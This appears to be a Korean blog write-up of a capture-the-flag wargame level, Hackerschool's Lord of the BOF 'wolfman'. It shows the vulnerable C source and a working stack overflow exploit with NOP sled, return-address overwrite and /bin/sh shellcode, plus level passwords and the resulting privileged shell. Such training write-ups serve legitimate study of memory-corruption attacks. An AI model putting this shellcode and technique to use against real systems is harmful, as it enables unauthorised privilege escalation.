---
layout: post
title: "[Wargame] 해커스쿨 BoF LEVEL5 (orc -> wolfman) : egghunter + bufferhunter"
date: 2015-11-06 23:50
comments: true
categories:  wargame
tags: [bof]
---

- id = orc 
- pw = cantata

<!--more-->

사실 이번 문제는 이전 Stage#4와 차이점은 buffer 앞의 40bytes 에 0 으로 초기화.
이전 문제를 운이 좋게도 buffer 앞에 NOP 를 넣고 `LR` 뒤에 shellcode 를 넣도록 구성을 하여 이번 문제는 그대로 풀린다. ㅋㅋ

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - wolfman
        - egghunter + buffer hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }
        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

## Exploit

```bash
[NOP 44bytes][LR][NOP 20bytes][ShellCode]

./wolfman `python -c 'print "\x90"*44 + "\x94\xfc\xff\xbf" + "\x90" * 20 + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'`
```

## Next stage

```bash
bash$ id °
uid=504(orc) gid=504(orc) euid=505(wolfman) egid=505(wolfman) groups=504(orc)

bash$ my-pass
euid = 505
love eyuna 
```